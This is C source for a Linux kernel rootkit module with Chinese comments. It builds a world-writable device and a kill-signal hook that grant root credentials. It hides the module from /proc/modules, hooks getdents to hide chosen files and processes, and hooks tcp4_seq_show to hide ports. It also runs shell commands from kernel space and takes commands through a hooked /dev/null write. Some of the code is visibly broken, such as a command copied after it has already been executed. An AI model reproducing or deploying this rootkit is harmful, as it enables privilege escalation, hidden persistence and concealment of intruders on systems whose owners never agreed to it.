#include <linux/fs.h>
#include <linux/module.h>
#include <linux/dirent.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/device.h>
#include <linux/kobject.h>
#include <linux/tcp.h>
#include <linux/syscalls.h>
#include "asm/uaccess.h"
#include "rootkit.h"

// 修改cred获得root权限
static void get_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
    commit_creds(newcreds);
    // 第二种方法同样可行
    commit_creds(prepare_creds());
}

// 注册设备,访问即可获得root权限
static int register_dev(void)
{
    // 注册设备
    major_num = register_chrdev(0, DEVICE_NAME, &rootkit_fo);
    if (major_num < 0)
        return major_num;

    // 创建设备响应类模块
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(module_class))
    {
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_class);
    }

    // 创建设备节点
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
    if (IS_ERR(module_device))
    {
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_device);
    }
    __file = filp_open(DEVICE_PATH, O_RDWR, 0);
    if (IS_ERR(__file)) // failed
    {
        device_destroy(module_class, MKDEV(major_num, 0));
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(__file);
    }
    __inode = file_inode(__file);
    __inode->i_mode |= 0666;
    filp_close(__file, NULL);
    return 0;
}

// 删除相应设备
static int unregister_dev(void)
{
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(major_num, DEVICE_NAME);
    return 0;
}

static int rootkit_open(struct inode *__inode, struct file *__file)
{
    return 0;
}

static ssize_t rootkit_read(struct file *__file, char __user *user_buf, size_t size, loff_t *__loff)
{
    pr_info("rootkit read!!");
    get_root();
    return 0;
}

static ssize_t rootkit_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)
{
    pr_info("rootkit wirte!!");
    return 0;
}

static int rootkit_release(struct inode *__inode, struct file *__file)
{
    return 0;
}

static long rootkit_ioctl(struct file *__file, unsigned int cmd, unsigned long param)
{
    return 0;
}

// 保存模块基本信息
static inline void module_info(void)
{
    module_prev = THIS_MODULE->list.prev;
    kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;
}

// 模块隐藏函数定义
static void hide_myself(void)
{
    if (module_hide)
        return;
    // 摘除链表，/proc/modules中不可见
    list_del(&THIS_MODULE->list);

    // list_del(&THIS_MODULE->mkobj.kobj.entry);

    pr_info("Module hide success");
    module_hide = 1;
    // 摘除kobj，/sys/modules/中不可见。
    // kobject_del(&THIS_MODULE->mkobj.kobj);
}

// 模块隐藏恢复
static void show_myself(void)
{
    if (!module_hide)
        return;
    list_add(&THIS_MODULE->list, module_prev);
    // list_add(&THIS_MODULE->mkobj.kobj.entry, kobj_prev);
    pr_info("Module show success");
    module_hide = 0;
    // int err = kobject_add(kobj,NULL,"%s");
    // if (err)
    // {
    //     kobject_put(kobj);
    //     return;
    // }
}

// 命令执行模块
static char *exec_cmd(char __user *cmd)
{
    int result;
    loff_t pos;
    struct file *fp;
    static char buf[1024];

    char *cmd_path = "/bin/sh";
    // char *output = " > /tmp/result.txt";
    char *tmp = kmalloc(256, GFP_KERNEL);
    char *cmd_argv[] = {cmd_path, "-c", tmp, NULL};
    char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL};
    result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
    strcpy(tmp, cmd);
    pr_info("[exec_cmd]: call_usermodehelper() result is %d\n", result);
    return 0;
    pr_info("4");
    fp = filp_open("/tmp/result.txt", O_RDWR | O_CREAT, 0644);
    if (IS_ERR(fp))
    {
        pr_info("open file failed!");
        return 0;
    }
    memset(buf, 0, sizeof(buf));
    pos = 0;
    kernel_read(fp, buf, sizeof(buf), &pos);
    pr_info("shell result %ld:\n", strlen(buf));
    pr_info("%s\n", buf);
    filp_close(fp, NULL);
    return buf;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
// 获取系统调用表
// 内核版本小于5.10注释
long get_kallsyms_lookup(void)
{
    static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"};
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name_my;
    // 注册kprobe
    register_kprobe(&kp);

    kallsyms_lookup_name_my = (kallsyms_lookup_name_t)kp.addr;

    // 卸载kprobe
    unregister_kprobe(&kp);
    return kallsyms_lookup_name_my("sys_call_table");
}
#endif

// 添加隐藏的文件
int insert_file_node(char *name)
{

    Name_list *tmp = (Name_list *)kmalloc(sizeof(Name_list), GFP_KERNEL);
    char *c_tmp = (char *)kmalloc(sizeof(name), GFP_KERNEL);
    strcpy(c_tmp, name);
    tmp->name = c_tmp;
    list_add(&tmp->list, &name_list);
    return 0;
}

// 删除隐藏的文件
int delete_file_node(char *name)
{
    struct list_head *tmp;
    Name_list *cur;
    list_for_each(tmp, &name_list)
    {
        cur = list_entry(tmp, Name_list, list);
        if (!strcmp(cur->name, name))
        {
            list_del(&cur->list);
            kfree(cur->name);
            kfree(cur);
            return 0;
        }
    }
    pr_info("[delete_port_node]:%s is not exist!!", name);
    return -1;
}

// 打印隐藏文件
int print_name_node(void)
{
    struct list_head *tmp;
    Name_list *cur;
    list_for_each(tmp, &name_list)
    {
        cur = list_entry(tmp, Name_list, list);
        pr_info("[print_name_node]:%s", cur->name);
    }
    pr_info("[print_name_node]:no file!!");
    return 0;
}

// 检查文件名是否为需要隐藏的文件名
int check_file(char *name)
{
    struct list_head *tmp;
    Name_list *cur;
    list_for_each(tmp, &name_list)
    {
        cur = list_entry(tmp, Name_list, list);
        if (!strcmp(cur->name, name))
            return 1;
    }
    return 0;
}

int insert_port_node(int port)
{
    Port_list *tmp = (Port_list *)kmalloc(sizeof(Port_list), GFP_KERNEL);
    tmp->port = port;
    list_add(&tmp->list, &port_list);
    return 0;
}

int delete_port_node(int port)
{
    struct list_head *tmp;
    Port_list *cur;
    list_for_each(tmp, &port_list)
    {
        cur = list_entry(tmp, Port_list, list);
        if (cur->port == port)
        {
            list_del(&cur->list);
            kfree(cur);
            return 0;
        }
    }
    pr_info("[delete_port_node]:%d is not exist!!", port);
    return -1;
}

int print_port_node(void)
{
    struct list_head *tmp;
    Port_list *cur;
    list_for_each(tmp, &port_list)
    {
        cur = list_entry(tmp, Port_list, list);
        pr_info("[print_port_node]:%d", cur->port);
    }
    pr_info("[print_port_node]:no port!!");
    return 0;
}

// 检查端口号是否需要隐藏
int check_port(int port)
{
    struct list_head *tmp;
    Port_list *cur;
    list_for_each(tmp, &port_list)
    {
        cur = list_entry(tmp, Port_list, list);
        if (cur->port == port)
            return 1;
    }
    return 0;
}

// hookmkdir系统调用，拦截目录创建
asmlinkage long hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};
    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
    return orig_mkdir(regs);
}

// getdents hook函数
asmlinkage long hook_getdents(const struct pt_regs *regs)
{
    long ret;
    unsigned short len = 0;
    unsigned short tlen = 0;
    unsigned int fd;
    long error;
    struct linux_dirent __user *dirent;
    struct linux_dirent *dirent_ker = NULL, *current_dir;
    unsigned int count;

    // 获取函数参数值
    fd = regs->di;
    dirent = regs->si;
    count = regs->dx;
    pr_info("getdents not 64 hook success!!");

    // 调用原始函数，截取返回值
    ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret < 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    tlen = ret;
    current_dir = dirent_ker;
    // 遍历文件节点列表，找到返回文件名
    while (tlen > 0)
    {
        len = current_dir->d_reclen;
        tlen = tlen - len;
        if (check_file(current_dir->d_name))
        {
            ret = ret - len;
            memmove(current_dir, (char *)current_dir + current_dir->d_reclen, tlen);
        }
        else
            current_dir = (struct linux_dirent *)((char *)current_dir + current_dir->d_reclen);
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;
done:
    kfree(dirent_ker);
    return ret;
}

// getdents64hook函数，由于进程在Linux系统中也是由文件存在的，因此进程隐藏也可复用。
asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    long ret;
    unsigned short len = 0;
    unsigned short tlen = 0;
    unsigned int fd;
    long error;
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *dirent_ker = NULL, *current_dir;
    unsigned int count;

    // 获取函数参数值
    fd = regs->di;
    dirent = (struct linux_dirent64 *)regs->si;
    count = regs->dx;
    // pr_info("getdents64 hook success!!");

    // 调用原始函数，截取返回值
    ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret < 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    tlen = ret;
    current_dir = dirent_ker;
    // 遍历文件节点列表，找到返回文件名
    while (tlen > 0)
    {
        len = current_dir->d_reclen;
        tlen = tlen - len;
        if (check_file(current_dir->d_name))
        {
            ret = ret - len;
            memmove(current_dir, (char *)current_dir + current_dir->d_reclen, tlen);
        }
        else
            current_dir = (struct linux_dirent64 *)((char *)current_dir + current_dir->d_reclen);
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;
done:
    kfree(dirent_ker);
    return ret;
}

// hook kill函数，可做进程保护
asmlinkage long hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;
    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        get_root();
    }
    return orig_kill(regs);
}

// hook tcp4_seq_show函数
asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    // 检测端口，是不调用tcp4_seq_show函数即可。
    if (sk != 0x1 && check_port(sk->sk_num))
        return 0;
    return orig_tcp4_seq_show(seq, v);
}

//匹配命令
char keyfromstring(const char *key)
{
    typedef struct
    {
        char *key;
        char val;
    } t_symstruct;

    static t_symstruct lookuptable[] = {{"getroot", '0'}, {"hidemodule", '1'}, {"showmodule", '2'}, {"hidefile", '3'}, {"showfile", '4'}, {"hideprocess", '5'}, {"showprocess", '6'}, {"hideport", '7'}, {"showport", '8'}};
    int len = sizeof(lookuptable) / sizeof(t_symstruct);
    int i;
    for (i = 0; i < len; i++)
    {
        t_symstruct *sym = &lookuptable[i];
        if (strncmp(key, sym->key, strlen(sym->key)) == 0)
            return sym->val;
    }
    return '-';
}

// hook null_write函数，做消息传递
asmlinkage ssize_t hook_write_null(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
    char *kbuf;
    long error;
    int res;
    // if (buf[0] != "#")
    //     return count;
    // 分配内核空间
    kbuf = kzalloc(count, GFP_KERNEL);

    // 从用户空间拷贝数据
    error = copy_from_user(kbuf, buf, count - 1);
    if (error)
        pr_alert("rootkit: %ld bytes could not be copied into kbuf\n", error);
    // 可以获取到消息，完善匹配制度即可。

    switch (keyfromstring(kbuf))
    {
    case '0':
        // register_dev();
        // break;
    case '1':
        hide_myself();
        pr_info("hide module success!!");
        break;
    case '2':
        show_myself();
        pr_info("show module success!!");
        break;
    case '3':
        insert_file_node(strim(kbuf + 8 + 1));
        break;
    case '4':
        delete_file_node(strim(kbuf + 8 + 1));
        break;
    case '5':
        insert_file_node(strim(kbuf + 11 + 1));
        // pr_info("hide file/process success!!", kbuf + 2);
        break;

    case '6':
        delete_file_node(skip_spaces(kbuf + 11 + 1));
        // pr_info("show file/process success!!", kbuf + 2);
        break;
    case '7':
        kstrtoint(skip_spaces(kbuf + 8 + 1), 0, &res);
        insert_port_node(res);
        // pr_info("hide port success!!");
        break;
    case '8':
        kstrtoint(skip_spaces(kbuf + 8 + 1), 0, &res);
        delete_port_node(res);
        // pr_info("show port success!!");
        break;
    default:
        break;
    }

    kfree(kbuf);
    return count;
}

asmlinkage ssize_t hook_read_null(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
    get_root();
    return 0;
}